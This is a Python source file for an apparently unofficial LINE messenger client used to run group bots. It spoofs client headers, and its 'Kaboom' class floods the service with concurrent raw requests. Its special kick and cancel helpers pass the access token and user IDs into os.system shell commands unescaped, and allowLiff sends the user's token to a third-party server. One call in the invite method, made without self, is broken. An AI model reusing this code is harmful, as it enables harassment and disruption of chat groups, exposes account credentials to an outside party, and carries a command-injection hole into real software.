        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = updateGroup_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.e is not None:
            raise Exception("code={}, reason:{}, param:{}".format(result.e.code,result.e.reason,result.e.parameterMap))
        return
        
    def reissueGroupTicket(self, groupMid):
        self._oprot.writeMessageBegin('reissueGroupTicket', TMessageType.CALL, 0)
        reissueGroupTicket_args(groupMid = groupMid).write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = reissueGroupTicket_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.success is not None:
            return result.success
        if result.e is not None:
            raise Exception("code={}, reason:{}, param:{}".format(result.e.code,result.e.reason,result.e.parameterMap))
        raise TApplicationException(TApplicationException.MISSING_RESULT, "reissueGroupTicket failed: unknown result")
        
    def acceptGroupInvitationByTicket(self, GroupMid, ticketId):
        self._oprot.writeMessageBegin('acceptGroupInvitationByTicket', TMessageType.CALL, 0)
        acceptGroupInvitationByTicket_args(reqSeq = 0, GroupMid = GroupMid, ticketId = ticketId).write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = acceptGroupInvitationByTicket_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.e is not None:
            raise Exception("code={}, reason:{}, param:{}".format(result.e.code,result.e.reason,result.e.parameterMap))
        return
        
    def leaveGroup(self, groupId):
        self._oprot.writeMessageBegin('leaveGroup', TMessageType.CALL, 0)
        leaveGroup_args(reqSeq = 0, groupId = groupId).write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = leaveGroup_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.e is not None:
            raise Exception("code={}, reason:{}, param:{}".format(result.e.code,result.e.reason,result.e.parameterMap))
        return

    def getRoom(self, roomId):
        self._oprot.writeMessageBegin('getRoom', TMessageType.CALL, 0)
        getRoom_args(roomId = roomId).write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = getRoom_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.success is not None:
            return result.success
        if result.e is not None:
            raise Exception("code={}, reason:{}, param:{}".format(result.e.code,result.e.reason,result.e.parameterMap))
        raise TApplicationException(TApplicationException.MISSING_RESULT, "getRoom failed: unknown result")

    def getCompactRoom(self, roomId):
        self._oprot.writeMessageBegin('getCompactRoom', TMessageType.CALL, 0)
        getCompactRoom_args(roomId = roomId).write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = getCompactRoom_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.success is not None:
            return result.success
        if result.e is not None:
            raise Exception("code={}, reason:{}, param:{}".format(result.e.code,result.e.reason,result.e.parameterMap))
        raise TApplicationException(TApplicationException.MISSING_RESULT, "getCompactRoom failed: unknown result")

    def inviteIntoRoom(self, reqSeq, roomId, contactIds):
        self._oprot.writeMessageBegin('inviteIntoRoom', TMessageType.CALL, 0)
        inviteIntoRoom_args(reqSeq = reqSeq, roomId = roomId, contactIds = contactIds).write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = inviteIntoRoom_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.success is not None:
            return result.success
        if result.e is not None:
            raise Exception("code={}, reason:{}, param:{}".format(result.e.code,result.e.reason,result.e.parameterMap))
        raise TApplicationException(TApplicationException.MISSING_RESULT, "inviteIntoRoom failed: unknown result")

    def createRoom(self, reqSeq, contactIds):
        self._oprot.writeMessageBegin('createRoom', TMessageType.CALL, 0)
        createRoom_args(reqSeq = reqSeq, contactIds = contactIds).write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = createRoom_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.success is not None:
            return result.success
        if result.e is not None:
            raise Exception("code={}, reason:{}, param:{}".format(result.e.code,result.e.reason,result.e.parameterMap))
        raise TApplicationException(TApplicationException.MISSING_RESULT, "createRoom failed: unknown result")

    def leaveRoom(self, roomId):
        self._oprot.writeMessageBegin('leaveRoom', TMessageType.CALL, 0)
        leaveRoom_args(reqSeq = 0, roomId = roomId).write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = leaveRoom_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.e is not None:
            raise Exception("code={}, reason:{}, param:{}".format(result.e.code,result.e.reason,result.e.parameterMap))
        return
    
    def getGroupIdsJoined(self):
        self._oprot.writeMessageBegin('getGroupIdsJoined', TMessageType.CALL, 0)
        getGroupIdsJoined_args().write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = getGroupIdsJoined_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.success is not None:
            return result.success
        if result.e is not None:
            raise Exception("code={}, reason:{}, param:{}".format(result.e.code,result.e.reason,result.e.parameterMap))
        raise TApplicationException(TApplicationException.MISSING_RESULT, "getGroupIdsJoined failed: unknown result")
        
    def getGroupIdsInvited(self):
        self._oprot.writeMessageBegin('getGroupIdsInvited', TMessageType.CALL, 0)
        getGroupIdsInvited_args().write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = getGroupIdsInvited_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.success is not None:
            return result.success
        if result.e is not None:
            raise Exception("code={}, reason:{}, param:{}".format(result.e.code,result.e.reason,result.e.parameterMap))
        raise TApplicationException(TApplicationException.MISSING_RESULT, "getGroupIdsInvited failed: unknown result")
        
    def updateProfile(self, profile):
        self._oprot.writeMessageBegin('updateProfile', TMessageType.CALL, 0)
        updateProfile_args(reqSeq = 0, profile = profile).write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = updateProfile_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.e is not None:
            raise Exception("code={}, reason:{}, param:{}".format(result.e.code,result.e.reason,result.e.parameterMap))
        return
        
    def rejectGroupInvitation(self, groupId):
        self._oprot.writeMessageBegin('rejectGroupInvitation', TMessageType.CALL, 0)
        rejectGroupInvitation_args(reqSeq = 0, groupId = groupId).write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = rejectGroupInvitation_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.e is not None:
            raise Exception("code={}, reason:{}, param:{}".format(result.e.code,result.e.reason,result.e.parameterMap))
        return
        
    def findGroupByTicket(self, ticketId):
        self._oprot.writeMessageBegin('findGroupByTicket', TMessageType.CALL, 0)
        findGroupByTicket_args(ticketId = ticketId).write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = findGroupByTicket_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.success is not None:
            return result.success
        if result.e is not None:
            raise Exception("code={}, reason:{}, param:{}".format(result.e.code,result.e.reason,result.e.parameterMap))
        raise TApplicationException(TApplicationException.MISSING_RESULT, "findGroupByTicket failed: unknown result")

    def createGroup(self, seq, name, contactIds):
        self._oprot.writeMessageBegin('createGroup', TMessageType.CALL, 0)
        createGroup_args(seq = seq, name = name, contactIds = contactIds).write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = createGroup_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.success is not None:
            return result.success
        if result.e is not None:
            raise Exception("code={}, reason:{}, param:{}".format(result.e.code,result.e.reason,result.e.parameterMap))
        raise TApplicationException(TApplicationException.MISSING_RESULT, "createGroup failed: unknown result")

    #def getRSAKeyInfo(self, provider):
        #self._oprot.writeMessageBegin('getRSAKeyInfo', TMessageType.CALL, 0)
        #getRSAKeyInfo_args(provider = provider).write(self._oprot)
        #self._oprot.writeMessageEnd()
        #self._oprot.trans.flush()
        #iprot = self._iprot
        #(fname, mtype, rseqid) = iprot.readMessageBegin()
       # if mtype == TMessageType.EXCEPTION:
            #x = TApplicationException()
           # x.read(iprot)
           # iprot.readMessageEnd()
            #raise x
       # result = getRSAKeyInfo_result()
        #result.read(iprot)
        #iprot.readMessageEnd()
      #  if result.success is not None:
            #return result.success
      #  if result.e is not None:
           # raise Exception("code={}, reason:{}, param:{}".format(result.e.code,result.e.reason,result.e.parameterMap))
        #raise TApplicationException(TApplicationException.MISSING_RESULT, "getRSAKeyInfo failed: unknown result")

class Auth(object):
    
    def __init__(self, iprot, oprot=None):
        self._iprot = self._oprot = iprot
        if oprot is not None:
            self._oprot = oprot

    def getAuthQrcode(self, keepLoggedIn, systemName):
        self._oprot.writeMessageBegin('getAuthQrcode', TMessageType.CALL, 0)
        getAuthQrcode_args(keepLoggedIn = keepLoggedIn, systemName = systemName).write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = getAuthQrcode_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.success is not None:
            return result.success
        if result.e is not None:
            raise Exception("code={}, reason:{}, param:{}".format(result.e.code,result.e.reason,result.e.parameterMap))
        raise TApplicationException(TApplicationException.MISSING_RESULT, "getAuthQrcode failed: unknown result")

    def loginZ(self, req):
        self._oprot.writeMessageBegin('loginZ', TMessageType.CALL, 0)
        args = loginZ_args()
        args.req = req
        args.write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
                x = TApplicationException()
                x.read(iprot)
                iprot.readMessageEnd()
                raise x
        result = loginZ_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.success is not None:
                return result.success
        if result.e is not None:
                raise result.e
        raise TApplicationException(TApplicationException.MISSING_RESULT, "loginZ failed: unknown result")

class Template(object):
    def __init__(self, iprot, oprot=None):
        self._iprot = self._oprot = iprot
        if oprot is not None:
            self._oprot = oprot

    def issueLiffView(self, request):
        self._oprot.writeMessageBegin('issueLiffView', TMessageType.CALL, 0)
        issueLiffView_args(request = request).write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = issueLiffView_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.success is not None:
            return result.success
        if result.e is not None:
            raise result.e
        raise TApplicationException(TApplicationException.MISSING_RESULT, "issueLiffView failed: unknown result")

    def getProduct(self, packageID, language, country):
        self._oprot.writeMessageBegin('getProduct', TMessageType.CALL, 0)
        getProduct_args(packageID = packageID, language = language, country = country).write(self._oprot)
        self._oprot.writeMessageEnd()
        self._oprot.trans.flush()
        iprot = self._iprot
        (fname, mtype, rseqid) = iprot.readMessageBegin()
        if mtype == TMessageType.EXCEPTION:
            x = TApplicationException()
            x.read(iprot)
            iprot.readMessageEnd()
            raise x
        result = getProduct_result()
        result.read(iprot)
        iprot.readMessageEnd()
        if result.success is not None:
            return result.success
        if result.e is not None:
            raise result.e
        raise TApplicationException(TApplicationException.MISSING_RESULT, "getProduct failed: unknown result")

class Kaboom(object):

    def __init__(self, auth, datas = [], server = 'IOS\t9.18.1\tIOS\t12.4.1'):
        self.token = auth
        self.server = server
        start = time.time()
        loop = asyncio.get_event_loop()
        future = asyncio.ensure_future(self.run(datas))
        loop.run_until_complete(future)
        end = time.time()
        try:
            print('Each Data Cost:', (end - start)/len(datas), 's')
        except:
            pass
        
    async def fetch(self, url, session, data, headers):
        async with session.post(url=url, data=data, headers=headers) as response:
            return await response.read()

    async def bound_fetch(self, sem, url, session, data, headers):
        async with sem:
            await self.fetch(url, session, data, headers)

    async def run(self, datas):
        url = "https://legy-jp.line.naver.jp/S4"
        tasks = []
        sem = asyncio.Semaphore(1000)
        async with ClientSession() as session:
            for data in datas:
                headers = {
                    'Content-Type': 'application/x-thrift',
                    'User-Agent': 'Line/10.2.1',
                    'X-Line-Application': self.server,
                    'Content-Length': str(len(data)),
                    'X-Line-Access': self.token
                }
                task = asyncio.ensure_future(self.bound_fetch(sem, url, session, data, headers))
                tasks.append(task)
            responses = asyncio.gather(*tasks)
            await responses

class LINE(object):
    UA = {
        "android": "Line/3.0.8",
        "windows": "Line/9.2.0 iPad6,5 11.12.1",
        "wp": "Line/5.11.3",
        "mac": "Line/9.2.0 iPad6,5 11.12.1",
        "ipad": "Line/9.2.0 iPad6,5 11.12.1",
        "iphone": "Line/9.20.2",
        "win10": "Line/5.5.5",
        "tizen": "Mozilla/5.0 (Linux; Tizen 2.3; SAMSUNG SM-Z130H) AppleWebKit/537.3 (KHTML, like Gecko) Version/2.3 Mobile Safari/537.3",
        "fox": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/58.0.3029.110 Safari/537.36",
        "ios": "Line/10.2.1",
        "chrome": "Line/19.8.1"
        }
    LA = {
        "android": "ANDROIDLITE 2.5.0 Android 7.1.1",
        "windows": "DESKTOPWIN\t5.21.1\tWINDOWS\t10.12.0",
        "wp": "WINPHONE 5.11.3 Lumia 10.0",
        "mac": "DESKTOPMAC\t5.21.1-YOSEMITE-x64\tMAC\t10.12.0",
        "ipad": "IOSIPAD\t9.2.0\tiPhone OS\t11.12.1",
        "iphone": "IOS        8.16.2  Iphone X        8.1.0",
        "win10": "WIN10 5.5.5 RezalBots12.1.1",
        "tizen": "TIZEN 1.4.3 Samsung2.3",
        "fox": "FIREFOXOS 1.4.11 Firefox_OS 1",
        "ios": "IOS\t10.2.1\tIOS\t12.4.1",
        "chrome": "CHROMEOS\t2.3.1\tChrome_OS\t1"
        }
        
    def __init__(self, token = "", apps=None):
        if apps is not None:
            self.appName = self.LA[apps]
            self.userAgent = self.UA[apps]
        else:
            self.appName = self.LA['ios']
            self.userAgent = self.UA['ios']
        if token == "":
            self.token = self.getQRLogin()
        else:
            self.token = token
        self.header = self.getHeader()
        self.talk = self.logintalk()
        self.poll = self.loginpoll()
        self.liff = self.loginliff()
        self.thread = self.threadsafe()
        self.revision = self.poll.getLastOpRevision()
        self.profile = self.talk.getProfile()
        self.limit = False
        
    def getHeader(self):
        Headers={'User-Agent': self.userAgent, 'X-Line-Application': self.appName, 'X-Line-Access': self.token, 'X-Line-Carrier': '51089, 1-0' }
        return Headers

    """
    LOGIN  METHODS
    :qr
    :token
    :email and passwd
    :talk
    :poll
    :liff
    :thread
    """
    def loginqr(self):
        hr = {'User-Agent': self.userAgent,'X-Line-Application': self.appName,"x-lal": "ja-US_US",'x-lpqs' : '/api/v4/TalkService.do'}
        transport = THttpClient('https://gd2.line.naver.jp/api/v4/TalkService.do')
        transport.setCustomHeaders(hr)
        qr = Auth(TCompactProtocol(transport)).getAuthQrcode(keepLoggedIn=1, systemName='ReanBot')
        print('Open this link on your LINE for smartphone in 2 minutes\n{}'.format("line://au/q/" + qr.verifier))
        hr.update({"x-lpqs" : '/api/v4/TalkService.do', 'X-Line-Access': qr.verifier})
        json.loads(requests.session().get('https://gd2.line.naver.jp/Q', headers=hr).text)
        hr.update({'x-lpqs' : '/api/v4p/rs'})
        transport = THttpClient('https://gd2.line.naver.jp/api/v4p/rs')
        transport.setCustomHeaders(hr)
        return Auth(TCompactProtocolAccelerated(transport)).loginZ(LoginRequest(type = 1, verifier = qr.verifier, e2eeVersion = 1)).authToken

    def logintalk(self, thrift = True):
        transport = THttpClient('https://gsx.line.naver.jp/S4', upsp = thrift) # THttpClient
        transport.setCustomHeaders(self.header)
        talk = Client(TCompactProtocolAccelerated(transport)) # TCompactProtocolAccelerated
        transport.open()
        return talk
    
    def threadsafe(self):
        transport = THttpClient('https://legy-jp.line.naver.jp/S4')
        transport.setCustomHeaders(self.header)
        transport.open()
        return transport
    
    def loginpoll(self):
        transport = THttpClient('https://gwx.line.naver.jp/P4') # THttpClient
        transport.setCustomHeaders(self.header)
        poll = Client(TCompactProtocolAccelerated(transport)) # TCompactProtocolAccelerated
        transport.open()
        return poll
    
    def loginliff(self):
        transport = THttpClient('https://gwx.line.naver.jp/LIFF1') 
        transport.setCustomHeaders(self.header)
        liff = Template(TCompactProtocolAccelerated(transport)) 
        transport.open()
        return liff
    
    """
    GROUP METHODS
    """
    def getGroups(self, groupIds):
        """
        :param group_mids:list(str())
         GETS GROUP OBJECTS FROM LIST OF GROUP MIDS
        :return:
        """
        return self.talk.getGroups(groupIds)
    
    def getGroup(self, groupId):
        """
        :param group_mid:str()
        GETS GROUP OBJECT BY GROUP MID
        :return:
        """
        return self.talk.getGroup(groupId)

    def getCompactGroup(self, groupId):
        """
        :param group_mid:str()
        GETS GROUP OBJECT BY GROUP MID
        :return:
        """
        return self.talk.getCompactGroup(groupId)
    
    def getGroupWithoutMembers(self, groupId):
        """
        :param group_mid:str()
        GETS GROUP OBJECT BY GROUP MID
        :return:
        """
        return self.talk.getGroupWithoutMembers(groupId)

    def getGroupIdsJoined(self):
        """
        GETS A LIST OF GROUPS THE ACCOUNT IS A MEMBER OF
        :return group_mids:list(str())
        """
        return self.talk.getGroupIdsJoined()
    def getGroupIdsInvited(self):
        """
        GETS A LIST OF GROUPS THE ACCOUNT IS INVITED TO
        :return group_mids: list(str())
        """
        return self.talk.getGroupIdsInvited()

    def kickoutFromGroup(self, groupId, contactIds):
        """
        KICKS USERS FROM GROUP
        :param group_mid:str()
        :param member_mids:list(str())
        :return:
        """
        return self.talk.kickoutFromGroup(groupId, contactIds)

    def cancelGroupInvitation(self, groupId, contactIds):
        """
        CANCELS INVITATIONS TO GROUP
        :param group_mid:str()
        :param invitee_mids:list(str())
        :return:
        """
        return self.talk.cancelGroupInvitation(groupId, contactIds)

    def specialKC(self, to, member_mids = [], pending_mids = []):
        """
        KICKS AND CANCELS USERS FROM GROUP
        :param group_mid:str()
        :param member_mids:list(str())
        :param pending_mids:list(str())
        :return:
        """
        cmd = 'node expansion.js token={} gid={}'.format(self.token, to)
        for uid in member_mids:
            cmd += ' uid={}'.format(uid)
        for cud in pending_mids:
            cmd += ' cud={}'.format(cud)
        os.system(cmd)
        
    def specialCI(self, to, pending_mids = []):
        """
        CANCELS USERS FROM GROUP
        :param group_mid:str()
        :param pending_mids:list(str())
        :return:
        """
        cmd = 'node expansion.js token={} gid={}'.format(self.token, to)
        for cud in pending_mids:
            cmd += ' cud={}'.format(cud)
        os.system(cmd)
        
    def specialNook(self, to, members_mids = []):
        """
        CANCELS USERS FROM GROUP
        :param group_mid:str()
        :param members_mids:list(str())
        :return:
        """
        cmd = 'node expansion.js token={} gid={}'.format(self.token, to)
        for uid in members_mids:
            cmd += ' uid={}'.format(uid)
        os.system(cmd)

    def rejectGroupInvitation(self, groupId):
        """
        REJECTS PENDING INVITATION
        :param group_mid:str()
        :return:
        """
        return self.talk.rejectGroupInvitation(groupId)

    def inviteIntoGroup(self, groupId, contactIds):
        """
        INVITE CONTACTS TO GROUP
        :param group_mid:str()
        :param contact_mids:list(str())
        :return:
        """
        return self.talk.inviteIntoGroup(groupId, contactIds)

    def acceptGroupInvitation(self, groupId):
        """
        ACCEPTS PENDING INVITATION
        :param group_mid:str()
        :return:
        """
        return self.talk.acceptGroupInvitation(groupId)

    def leaveGroup(self, groupId):
        """
        LEAVES JOINED GROUP
        :param group_mid:str()
        :return:
        """
        return self.talk.leaveGroup(groupId)
       
    def updateGroup(self, group):
        """
        UPDATES GROUP OBJECT ON THE LINE SERVER TO THE GROUP OBJECT YOU SENT
        :param group_object: ttypes.Group
        :return:
        """
        return self.talk.updateGroup(group)

    def reissueGroupTicket(self, groupMid):
        """
        GETS GROUP TICKET (LAST PART OFF GROUP URL) BY GROUP MID
        :param group_mid:str()
        :return:
        """
        return self.talk.reissueGroupTicket(groupMid)

    def acceptGroupInvitationByTicket(self, GroupMid, ticketId):
        """
        JOINS GROUP BY GROUP TICKET AND GROUP ID
        :param group_mid:str()
        :param ticket_id:str()
        :return:
        """
        return self.talk.acceptGroupInvitationByTicket(GroupMid, ticketId)

    def findGroupByTicket(self, ticketId):
        """
        GETS GROUP BY TICKET
        :param ticket_id:str()
        :return:
        """
        return self.talk.findGroupByTicket(ticketId)

    def createGroup(self, name, contact_mids=[]):
        """
        CREATES GROUP WITH NAME WITH CONTACTS
        :param name:str()
        :param contact_mids:list(str())
        :return:
        """
        return self.talk.createGroup(0, name, contact_mids)
    
    """
    ROOM METHODS
    """
    def getRoom(self, room_mid):
        """
        GET ROOM OBJECT BY ROOM MID
        :param room_mid:str()
        :return: ttypes.Room
        """
        return self.talk.getRoom(room_mid)

    def getCompactRoom(self, room_mid):
        """
        GET COMPACT ROOM OBJECT BY ROOM MID
        :param room_mid:str()
        :return: ttypes.Room
        """
        return self.talk.getCompactRoom(room_mid)

    def inviteIntoRoom(self, room_mid, contact_mids=[]):
        """
        INVITE CONTACTS TO GROUP
        :param room_mid:str()
        :param contact_mids:list(str())
        :return:
        """
        return self.talk.inviteIntoRoom(room_mid, contact_mids)

    def createRoom(self, contact_mids=[]):
        """
        CREATES ROOM WITH CONTACTS
        :param contact_mids:list(str())
        :return: ttypes.Group
        """
        return self.talk.createRoom(0, contact_mids)
    
    def leaveRoom(self, roomId):
        """
        LEAVES JOINED ROOM
        :param room_mid:str()
        :return:
        """
        return self.talk.leaveRoom(roomId)

    """
    CONTACT METHODS
    """
    def getContacts(self, ids):
        """
        GET LIST OF CONTACT OBJECTS BY LIST OF CONTACT MIDS
        :param contact_mids:list(str())
        :return:list(ttypes.Contact)
        """
        return self.talk.getContacts(ids)

    def getContact(self, id):
        """
        GET CONTACT MID BY CONTACT MID
        :param contact_mid:str()
        :return:ttypes.Contact
        """
        return self.talk.getContact(id)

    def removeAllMessages(self, seq, lastMessageId):
        """
        Parameters:
        - seq
        - lastMessageId
        """
        return self.talk.removeAllMessages(seq, lastMessageId)
        
    def sendMessage(self, to, text, contentMetadata={}, contentType=0):
        return self.talk.sendMessage(to, text, contentMetadata, contentType)
    
    def fetchOperations(self, localRev, count):
        return self.poll.fetchOperations(localRev, count)
    def getLastOpRevision(self):
        return self.poll.getLastOpRevision()
    
    def getProfile(self):
        return self.talk.getProfile()
    
    def findAndAddContactsByMid(self, mid):
        return self.talk.findAndAddContactsByMid(mid)
    
    def sendFlex(self, to, data):
        token = self.liff.issueLiffView(LiffViewRequest('1602687308-GXq4Vvk9', LiffContext(chat=LiffChatContext(to))))
        headers = { 'Content-Type': 'application/json',
                             'Authorization': 'Bearer %s' % token.accessToken }
        data = { 'messages': [data] }
        try:
            return requests.post('https://api.line.me/message/v3/share', headers=headers, data=json.dumps(data))
        except:
            return
        
    def allowLiff(self):
        data = {
            'token': self.token,
            'apptype': self.appName,
            'liffid': '1602687308-GXq4Vvk9'
        }
        req = requests.post('https://api.ryns.site/allowliff', json=data)
        print(req.text)
        
    def thriftSpeed(self, thrift = True):
        self.talk = self.logintalk(thrift)
        
    def updateProfile(self, profile):
        self.talk.updateProfile(profile)
        self.profile = self.talk.getProfile()

    """
    DEF MODULE
    """
    def saveFile(self, path, raw):
        with open(path, 'wb') as f:
            print(path)
            shutil.copyfileobj(raw, f)

    def deleteFile(self, path):
        if os.path.exists(path):
            os.remove(path)
            return True
        else:
            return False

    def url_encode(self, url, path, params=[]):
        return url + path + '?' + urllib.parse.urlencode(params)

    def post_content(self, url, data=None, files=None):
        return requests.session().post(url, headers=self.header, data=data, files=files)
        
    def get_content(self, url, headers=None):
        return requests.session().get(url,headers=self.header,stream=True)

    def download_object_msg(self, messageId, returnAs='path', saveAs=''):
        if saveAs == '':
            saveAs = self.gen_temp_file('path')
        if returnAs not in ['path','bool','bin']:
            raise Exception('Invalid returnAs value')
        url = "https://obs-sg.line-apps.com/talk/m/download.nhn?oid="+messageId
        r = self.get_content(url)
        if r.status_code == 200:
            self.saveFile(saveAs, r.raw)
            if returnAs == 'path':
                return saveAs
            elif returnAs == 'bool':
                return True
            elif returnAs == 'bin':
                return r.raw
        else:
            raise Exception('Download object failure.')

    def gen_temp_file(self, returnAs='path'):
        try:
            if returnAs not in ['file','path']:
                raise Exception('Invalid returnAs value')
            fName, fPath = 'line-%s-%i.bin' % (int(time.time()), random.randint(0, 9)), tempfile.gettempdir()
            if returnAs == 'file':
                return fName
            elif returnAs == 'path':
                return os.path.join(fPath, fName)
        except Exception as e:
            print(e)

    def gen_obs_params(self, newList, returnAs='json'):
        oldList = {'name': self.gen_temp_file('file'),'ver': '1.0'}
        if returnAs not in ['json','b64','default']:
            raise Exception('Invalid parameter returnAs')
        oldList.update(newList)
        if 'range' in oldList:
            new_range='bytes 0-%s\/%s' % ( str(oldList['range']-1), str(oldList['range']) )
            oldList.update({'range': new_range})
        if returnAs == 'json':
            oldList=json.dumps(oldList)
            return oldList
        elif returnAs == 'b64':
            oldList=json.dumps(oldList)
            return base64.b64encode(oldList.encode('utf-8'))
        elif returnAs == 'default':
            return oldList

    def update_profile_picture(self, path, type='p'):
        files = {'file': open(path, 'rb')}
        params = {'oid': self.profile.mid,'type': 'image'}
        if type == 'vp':
            params.update({'ver': '2.0', 'cat': 'vp.mp4'})
        data = {'params': self.gen_obs_params(params)}
        r = self.post_content('https://obs-sg.line-apps.com/talk/p/upload.nhn', data=data, files=files)
        if r.status_code != 201:
            raise Exception('Update profile picture failure.')
        return True
        
    def sendText(self, to, text):
        self.sendFlex(to, {"type":"text","text":str(text)})
        
    def kick(self, gid, uid):
        try:
            self.talk.kickoutFromGroup(gid,[uid])
        except Exception as e:
            if "code=10" in str(e):
                print(self.profile.mid,'kick failed ',gid)
            elif "code=35" in str(e):
                self.limit = True
            return
        self.limit = False
#        data = b'\x82!\x00\x10kickoutFromGroup\x15\x00\x18!'+gid.encode()+b'\x19\x18!'+uid.encode()+b'\x00'
#        self.thread.flush_single(data)

    def cancel(self, gid, uid):
        self.talk.cancelGroupInvitation(gid, [uid])
#        data = b'\x82!\x00\x15cancelGroupInvitation\x15\x00\x18!'+gid.encode()+b'\x19\x18!'+uid.encode()+b'\x00'
#        self.thread.flush_single(data)

    def invite(self, gid, uid):
        try:
            self.talk.inviteIntoGroup(gid, [uid])
        except Exception as e:
            if "code=10" in str(e):
                print(self.profile.mid,'invite failed ',gid)
            elif "code=35" in str(e):
                self.limit = True
            G = self.getGroupWithoutMembers(gid)
            if G.preventedJoinByTicket == True:
                G.preventedJoinByTicket = False
            self.updateGroup(G)
            Ticket = reissueGroupTicket(gid)
            self.sendMessage(uid,".join {} {}".format(gid,Ticket))
            return
        self.limit = False
#        data = b'\x82!\x00\x0finviteIntoGroup\x15\x00\x18!'+gid.encode()+b'\x19\x18!'+uid.encode()+b'\x00'
#        self.thread.flush_single(data)
